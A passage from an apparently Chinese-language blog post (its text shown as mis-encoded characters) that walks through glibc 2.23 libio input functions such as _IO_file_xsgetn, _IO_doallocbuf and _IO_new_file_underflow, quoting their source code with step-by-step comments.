buf, bytes_requested);<br>  _IO_release_lock (fp);<br>  <span class="hljs-keyword">return</span> bytes_requested == bytes_read ? count : bytes_read / size;<br>&#125;<br></code></pre></td></tr></table></figure><p>_IO_sgetnå‡½æ•°åˆè°ƒç”¨äº†_IO_XSGETNå‡½æ•°ï¼Œå®é™…ä¸Šå°±æ˜¯è·³è½¬è¡¨ä¸­çš„__xsgetnå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br>_IO_size_t<br>_IO_sgetn (_IO_FILE *fp, <span class="hljs-type">void</span> *data, _IO_size_t n)<br>&#123;<br>  <span class="hljs-comment">/* FIXME handle putback buffer here! */</span><br>  <span class="hljs-keyword">return</span> _IO_XSGETN (fp, data, n);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_XSGETN(FP,DATA,N) JUMP2 (__xsgetn, FP, DATA, N)</span><br></code></pre></td></tr></table></figure><p>_IO_file_xsgetnæ‰§è¡Œæ­¥éª¤å¦‚ä¸‹ï¼š</p><ul><li>å¦‚æœç¼“å†²åŒºä¸ºç©ºè°ƒç”¨_IO_doallocbufåˆ†é…ç¼“å†²åŒº</li><li>å¦‚æœwant&lt;&#x3D;haveåˆ™è¯»å…¥wantä¸ªå­—èŠ‚å¹¶å°†wantæ¸…é›¶ï¼Œå¦åˆ™æ‰§è¡Œä»¥ä¸‹æ­¥éª¤</li><li>å¦‚æœè¿˜æœ‰å­—èŠ‚å‰©ä½™ï¼Œåˆ™è¯»å…¥å‰©ä½™haveå­—èŠ‚</li><li>å¦‚æœå­˜åœ¨backupåˆ™è°ƒç”¨_IO_switch_to_main_get_areaè°ƒç”¨backup</li><li>å¦‚æœç¼“å†²åŒºå®¹é‡å¤§äºéœ€æ±‚åˆ™è°ƒç”¨__underflowå‘ç¼“å†²åŒºä¸­è¯»å…¥</li><li>å°†æ‰€æœ‰è¯»å†™ç›¸å…³æŒ‡é’ˆæŒ‡å‘ç¼“å†²åŒºåŸºå€</li><li>è®¡ç®—countï¼Œç›´æ¥ä»æ–‡ä»¶ä¸­è¯»å–countå­—èŠ‚</li><li>é”™è¯¯å¤„ç†</li><li>è°ƒæ•´æ–‡ä»¶åç§»<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_size_t<br>_IO_file_xsgetn (_IO_FILE *fp, <span class="hljs-type">void</span> *data, _IO_size_t n)<br>&#123;<br>  _IO_size_t want, have;<br>  _IO_ssize_t count;<br>  <span class="hljs-type">char</span> *s = data;<br><br>  want = n;<br><br><span class="hljs-comment">//æ­¥éª¤ä¸€ï¼šå¦‚æœç¼“å†²åŒºä¸ºç©ºåˆ™åˆ†é…ç¼“å†²åŒº</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Maybe we already have a push back pointer.  */</span><br>      <span class="hljs-keyword">if</span> (fp-&gt;_IO_save_base != <span class="hljs-literal">NULL</span>)<br>&#123;<br>  <span class="hljs-built_in">free</span> (fp-&gt;_IO_save_base);<br>  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;<br>&#125;<br>      _IO_doallocbuf (fp);<br>    &#125;<br><br><span class="hljs-comment">//æ­¥éª¤äºŒï¼šå¾ªç¯è¯»å…¥å­—èŠ‚ç›´åˆ°æ»¡è¶³è¦æ±‚</span><br>  <span class="hljs-keyword">while</span> (want &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;<br><br><span class="hljs-comment">//åˆ†æ”¯1ï¼šå·²æœ‰å­—èŠ‚æ•°æ»¡è¶³è¦æ±‚åˆ™ç›´æ¥è¯»å…¥</span><br>      <span class="hljs-keyword">if</span> (want &lt;= have)<br>&#123;<br>  <span class="hljs-built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);<br>  fp-&gt;_IO_read_ptr += want;<br>  want = <span class="hljs-number">0</span>;<br>&#125;<br>      <span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-comment">//åˆ†æ”¯2-1ï¼šè¯»å…¥å·²æœ‰å­—èŠ‚ï¼Œæ­¤æ—¶ç¼“å†²åŒºå·²æ¸…ç©º</span><br>  <span class="hljs-keyword">if</span> (have &gt; <span class="hljs-number">0</span>)<br>    &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _LIBC</span><br>      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>      <span class="hljs-built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, have);<br>      s += have;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      want -= have;<br>      fp-&gt;_IO_read_ptr += have;<br>    &#125;<br><br><span class="hljs-comment">//åˆ†æ”¯2-2ï¼šæœ‰backupï¼ŒæŸ¥çœ‹backupå¹¶è¯»å…¥</span><br>  <span class="hljs-comment">/* Check for backup and repeat */</span><br>  <span class="hljs-keyword">if</span> (_IO_in_backup (fp))<br>    &#123;<br>      _IO_switch_to_main_get_area (fp);<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br><span class="hljs-comment">//åˆ†æ”¯2-3ï¼šç¼“å†²åŒºçš„å®¹é‡å¤§äºéœ€æ±‚åˆ™è°ƒç”¨__underflow</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base<br>      &amp;&amp; want &lt; (<span class="hljs-type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))<br>    &#123;<br>      <span class="hljs-keyword">if</span> (__underflow (fp) == EOF)<br><span class="hljs-keyword">break</span>;<br><br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>  <span class="hljs-comment">//è®¾ç½®æŒ‡é’ˆ</span><br>  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);<br>  _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);<br><br><span class="hljs-comment">//åˆ†æ”¯2-4ï¼šè®¡ç®—ç›´æ¥ä»æ–‡ä»¶ä¸­è¯»çš„å­—èŠ‚ä¸ªæ•°</span><br><span class="hljs-comment">//wantå‰©ä¸‹çš„å¾…è¯»å…¥ç¼“å†²åŒºåä»ç¼“å†²åŒºä¸­è¯»</span><br>  <span class="hljs-comment">/* Try to maintain alignment: read a whole number of blocks.  */</span><br>  count = want;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base)<br>    &#123;<br>      _IO_size_t block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;<br>      <span class="hljs-keyword">if</span> (block_size &gt;= <span class="hljs-number">128</span>)<br>count -= want % block_size;<br>    &#125;<br><span class="hljs-comment">//è°ƒç”¨_IO_SYSREADç›´æ¥ä»æ–‡ä»¶ä¸­è¯»å–countå­—èŠ‚</span><br><span class="hljs-comment">//_IO_SYSREADå®é™…ä¸Šå°±æ˜¯è·³è½¬è¡¨ä¸­çš„_IO_file_read</span><br><span class="hljs-comment">//æœ€ç»ˆè°ƒç”¨çš„æ˜¯ç³»ç»Ÿè°ƒç”¨read</span><br>  count = _IO_SYSREAD (fp, s, count);<br><span class="hljs-comment">//åˆ¤æ–­è¯»å…¥æ˜¯å¦æˆåŠŸ</span><br>  <span class="hljs-keyword">if</span> (count &lt;= <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (count == <span class="hljs-number">0</span>)<br>fp-&gt;_flags |= _IO_EOF_SEEN;<br>      <span class="hljs-keyword">else</span><br>fp-&gt;_flags |= _IO_ERR_SEEN;<br><br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>  s += count;<br>  want -= count;<br><span class="hljs-comment">//æ­¥éª¤ä¸‰ï¼šè°ƒæ•´æ–‡ä»¶åç§»</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)<br>    _IO_pos_adjust (fp-&gt;_offset, count);<br>&#125;<br>    &#125;<br><br>  <span class="hljs-keyword">return</span> n - want;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="IO-doallocbuf"><a href="#IO-doallocbuf" class="headerlink" title="_IO_doallocbuf"></a>_IO_doallocbuf</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br><span class="hljs-type">void</span><br>_IO_doallocbuf (_IO_FILE *fp)<br>&#123;<br><span class="hljs-comment">//å·²æœ‰ç¼“å†²åŒºåˆ™ç›´æ¥è¿”å›</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base)<br>    <span class="hljs-keyword">return</span>;<br><span class="hljs-comment">//æ¨¡å¼æˆ–è€…flagç¬¦åˆè¦æ±‚åˆ™è°ƒç”¨_IO_DOALLOCATE</span><br><span class="hljs-comment">//_IO_DOALLOCATEå®é™…ä¸Šå°±æ˜¯è·³è½¬è¡¨ä¸­çš„_IO_file_doallocate</span><br>  <span class="hljs-keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> (_IO_DOALLOCATE (fp) != EOF)<br>      <span class="hljs-keyword">return</span>;<br><span class="hljs-comment">//å¦‚æœç¼“å†²åŒºåˆå§‹åŒ–å¤±è´¥åˆ™è°ƒç”¨_IO_setb</span><br>  _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IO-file-doallocate"><a href="#IO-file-doallocate" class="headerlink" title="_IO_file_doallocate"></a>_IO_file_doallocate</h3><p>ä¸»è¦è¿‡ç¨‹å°±æ˜¯mallocä¸€å—ç¼“å†²åŒºç„¶åè°ƒç”¨_IO_setbè®¾å®šç¼“å†²åŒºç›¸å…³æŒ‡é’ˆ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\filedoalloc.c</span><br><br><span class="hljs-type">int</span><br>_IO_file_doallocate (_IO_FILE *fp)<br>&#123;<br>  _IO_size_t size;<br>  <span class="hljs-type">char</span> *p;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat64</span> <span class="hljs-title">st</span>;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _LIBC</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (_IO_cleanup_registration_needed != <span class="hljs-literal">NULL</span>))<br>    (*_IO_cleanup_registration_needed) ();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  size = _IO_BUFSIZ;<br><span class="hljs-comment">//è°ƒç”¨_IO_SYSSTATï¼ˆè·³è½¬è¡¨ä¸­çš„_IO_file_statï¼‰è·å–FILEä¿¡æ¯</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_fileno &gt;= <span class="hljs-number">0</span> &amp;&amp; __builtin_expect (_IO_SYSSTAT (fp, &amp;st), <span class="hljs-number">0</span>) &gt;= <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (S_ISCHR (st.st_mode))<br>&#123;<br>  <span class="hljs-comment">/* Possibly a tty.  */</span><br>  <span class="hljs-keyword">if</span> (<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> DEV_TTY_P</span><br>      DEV_TTY_P (&amp;st) ||<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      local_isatty (fp-&gt;_fileno))<br>    fp-&gt;_flags |= _IO_LINE_BUF;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> _IO_HAVE_ST_BLKSIZE</span><br>      <span class="hljs-keyword">if</span> (st.st_blksize &gt; <span class="hljs-number">0</span>)<br>size = st.st_blksize;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>  p = <span class="hljs-built_in">malloc</span> (size);<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (p == <span class="hljs-literal">NULL</span>))<br>    <span class="hljs-keyword">return</span> EOF;<br>  _IO_setb (fp, p, p + size, <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IO-setb"><a href="#IO-setb" class="headerlink" title="_IO_setb"></a>_IO_setb</h3><p>è®¾ç½®ç¼“å†²åŒºæŒ‡é’ˆ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br><span class="hljs-type">void</span><br>_IO_setb (_IO_FILE *f, <span class="hljs-type">char</span> *b, <span class="hljs-type">char</span> *eb, <span class="hljs-type">int</span> a)<br>&#123;<br>  <span class="hljs-keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))<br>    <span class="hljs-built_in">free</span> (f-&gt;_IO_buf_base);<br>  f-&gt;_IO_buf_base = b;<br>  f-&gt;_IO_buf_end = eb;<br>  <span class="hljs-keyword">if</span> (a)<br>    f-&gt;_flags &amp;= ~_IO_USER_BUF;<br>  <span class="hljs-keyword">else</span><br>    f-&gt;_flags |= _IO_USER_BUF;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="IO-switch-to-main-get-area"><a href="#IO-switch-to-main-get-area" class="headerlink" title="_IO_switch_to_main_get_area"></a>_IO_switch_to_main_get_area</h2><p>å°†ç¼“å†²åŒºç§»è‡³backup</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br><span class="hljs-type">void</span><br>_IO_switch_to_main_get_area (_IO_FILE *fp)<br>&#123;<br>  <span class="hljs-type">char</span> *tmp;<br>  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;<br>  <span class="hljs-comment">/* Swap _IO_read_end and _IO_save_end. */</span><br>  tmp = fp-&gt;_IO_read_end;<br>  fp-&gt;_IO_read_end = fp-&gt;_IO_save_end;<br>  fp-&gt;_IO_save_end= tmp;<br>  <span class="hljs-comment">/* Swap _IO_read_base and _IO_save_base. */</span><br>  tmp = fp-&gt;_IO_read_base;<br>  fp-&gt;_IO_read_base = fp-&gt;_IO_save_base;<br>  fp-&gt;_IO_save_base = tmp;<br>  <span class="hljs-comment">/* Set _IO_read_ptr. */</span><br>  fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_base;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="underflow"><a href="#underflow" class="headerlink" title="__underflow"></a>__underflow</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br><span class="hljs-type">int</span><br>__underflow (_IO_FILE *fp)<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>  <span class="hljs-keyword">if</span> (_IO_vtable_offset (fp) == <span class="hljs-number">0</span> &amp;&amp; _IO_fwide (fp, <span class="hljs-number">-1</span>) != <span class="hljs-number">-1</span>)<br>    <span class="hljs-keyword">return</span> EOF;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">//ä¸€äº›æ£€æŸ¥</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_mode == <span class="hljs-number">0</span>)<br>    _IO_fwide (fp, <span class="hljs-number">-1</span>);<br>  <span class="hljs-keyword">if</span> (_IO_in_put_mode (fp))<br>    <span class="hljs-keyword">if</span> (_IO_switch_to_get_mode (fp) == EOF)<br>      <span class="hljs-keyword">return</span> EOF;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)<br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) fp-&gt;_IO_read_ptr;<br>  <span class="hljs-keyword">if</span> (_IO_in_backup (fp))<br>    &#123;<br>      _IO_switch_to_main_get_area (fp);<br>      <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)<br><span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) fp-&gt;_IO_read_ptr;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (_IO_have_markers (fp))<br>    &#123;<br>      <span class="hljs-keyword">if</span> (save_for_backup (fp, fp-&gt;_IO_read_end))<br><span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (_IO_have_backup (fp))<br>    _IO_free_backup_area (fp);<br><span class="hljs-comment">//è°ƒç”¨_IO_UNDERFLOWï¼ˆè·³è½¬è¡¨ä¸­çš„_IO_new_file_underflowï¼‰</span><br><span class="hljs-comment">//JUMP0 (__underflow, fp)</span><br><span class="hljs-comment">//# define _IO_new_file_underflow _IO_file_underflow</span><br>  <span class="hljs-keyword">return</span> _IO_UNDERFLOW (fp);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IO-new-file-underflow"><a href="#IO-new-file-underflow" class="headerlink" title="_IO_new_file_underflow"></a>_IO_new_file_underflow</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>_IO_new_file_underflow (_IO_FILE *fp)<br>&#123;<br>  _IO_ssize_t count;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)<br>    <span class="hljs-keyword">return</span> (EOF);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)<br>    &#123;<br>      fp-&gt;_flags |= _IO_ERR_SEEN;<br>      __set_errno (EBADF);<br>      <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br><span class="hljs-comment">//ç¼“å†²åŒºæœªæ¸…ç©ºåˆ™ç›´æ¥è¿”å›</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)<br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) fp-&gt;_IO_read_ptr;<br><br><span class="hljs-comment">//æ²¡æœ‰ç¼“å†²åŒºåˆ™è°ƒç”¨_IO_doallocbufåˆ†é…ç¼“å†²åŒº</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Maybe we already have a push back pointer.  */</span><br>      <span class="hljs-keyword">if</span> (fp-&gt;_IO_save_base != <span class="hljs-literal">NULL</span>)<br>&#123;<br>  <span class="hljs-built_in">free</span> (fp-&gt;_IO_save_base);<br>  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;<br>&#125;<br>      _IO_doallocbuf (fp);<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))<br>    &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>      _IO_flush_all_linebuffered ();<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>      _IO_acquire_lock (_IO_stdout);<br><br>      <span class="hljs-keyword">if</span> ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))<br>  == (_IO_LINKED | _IO_LINE_BUF))<br>_IO_OVERFLOW (_IO_stdout, EOF);<br><br>      _IO_release_lock (_IO_stdout);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br><br>  _IO_switch_to_get_mode (fp);<br><br><span class="hljs-comment">//è®¾ç½®ç»“æ„ä½“æŒ‡é’ˆ</span><br>  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;<br>  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;<br>  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end<br>    = fp-&gt;_IO_buf_base;<br><br><span class="hljs-comment">//è°ƒç”¨_IO_SYSREADå‡½æ•°è¯»å…¥æ•°æ®</span><br>  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,<br>       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);<br>  <span class="hljs-keyword">if</span> (count &lt;= <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (count == <span class="hljs-number">0</span>)<br>fp-&gt;_flags |= _IO_EOF_SEEN;<br>      <span class="hljs-keyword">else</span><br>fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="hljs-number">0</span>;<br>  &#125;<br>  fp-&gt;_IO_read_end += count;<br>  <span class="hljs-keyword">if</span> (count == <span class="hljs-number">0</span>)<br>    &#123;<br>      fp-&gt;_offset = _IO_pos_BAD;<br>      <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)<br>    _IO_pos_adjust (fp-&gt;_offset, count);<br>  <span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) fp-&gt;_IO_read_ptr;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å…¶ä»–è¾“å…¥å‡½æ•°"><a href="#å…¶ä»–è¾“å…¥å‡½æ•°" class="headerlink" title="å…¶ä»–è¾“å…¥å‡½æ•°"></a>å…¶ä»–è¾“å…¥å‡½æ•°</h2><h3 id="scanf"><a href="#scanf" class="headerlink" title="scanf"></a>scanf</h3><p>scanfçš„å‡½æ•°è°ƒç”¨æ ˆå¦‚ä¸‹ï¼Œæœ€ç»ˆæ˜¯ä½¿ç”¨è·³è½¬è¡¨ä¸­çš„_IO_new_file_underflowå®ç°è¾“å…¥çš„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs 